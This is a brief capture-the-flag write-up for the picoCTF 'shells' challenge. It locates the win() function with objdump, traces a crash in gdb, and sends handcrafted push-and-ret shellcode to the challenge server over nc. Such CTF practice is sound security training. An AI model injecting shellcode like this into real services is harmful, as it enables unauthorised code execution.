## shells

> picoctf

##### win() : target address

```bash
$ objdump -D shells | grep win
08048540 <win>:
```

```bash
$ (python -c 'print "\x40\x85\x04\x08"';cat)|./shells
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
id
Segmentation fault (core dumped)
```

##### Segmentation Fault

```bash
(python -c 'print "\x40\x85\x04\x08"') > input
```

```bash
b *vuln+109 #read()
b *vuln+114

(gdb) r < input

<stack>
a
stuff
0

(gdb) x/32x stuff_addr
08048540 000000000 00000000 ...
```

```bash
gef➤  
0xf7fd5000 in ?? ()
```

##### shellcode : push + win()_addr + ret

```
gef➤  disas /r main
Dump of assembler code for function main:
   0x08048610 <+0>: 8d 4c 24 04 lea    ecx,[esp+0x4]
   0x08048614 <+4>: 83 e4 f0    and    esp,0xfffffff0
   0x08048617 <+7>: ff 71 fc    push   DWORD PTR [ecx-0x4]
   0x0804861a <+10>:    55  push   ebp
   0x0804861b <+11>:    89 e5   mov    ebp,esp
   0x0804861d <+13>:    51  push   ecx
   0x0804861e <+14>:    83 ec 04    sub    esp,0x4
   0x08048621 <+17>:    83 ec 0c    sub    esp,0xc
   0x08048624 <+20>:    68 74 87 04 08  push   0x8048774
   0x08048629 <+25>:    e8 b2 fd ff ff  call   0x80483e0 <puts@plt>
   0x0804862e <+30>:    83 c4 10    add    esp,0x10
   0x08048631 <+33>:    83 ec 0c    sub    esp,0xc
   0x08048634 <+36>:    68 ac 87 04 08  push   0x80487ac <====== *
   0x08048639 <+41>:    e8 a2 fd ff ff  call   0x80483e0 <puts@plt>
   0x0804863e <+46>:    83 c4 10    add    esp,0x10
   0x08048641 <+49>:    a1 60 9a 04 08  mov    eax,ds:0x8049a60
   0x08048646 <+54>:    83 ec 0c    sub    esp,0xc
   0x08048649 <+57>:    50  push   eax
   0x0804864a <+58>:    e8 81 fd ff ff  call   0x80483d0 <fflush@plt>
   0x0804864f <+63>:    83 c4 10    add    esp,0x10
   0x08048652 <+66>:    e8 09 ff ff ff  call   0x8048560 <vuln>
   0x08048657 <+71>:    b8 00 00 00 00  mov    eax,0x0
   0x0804865c <+76>:    8b 4d fc    mov    ecx,DWORD PTR [ebp-0x4]
   0x0804865f <+79>:    c9  leave  
   0x08048660 <+80>:    8d 61 fc    lea    esp,[ecx-0x4]
   0x08048663 <+83>:    c3  ret    <====== **
```

```
(python -c 'print "\x68"+"\x40\x85\x04\x08"+"\xc3"';cat)|nc shell2017.picoctf.com 40976
```
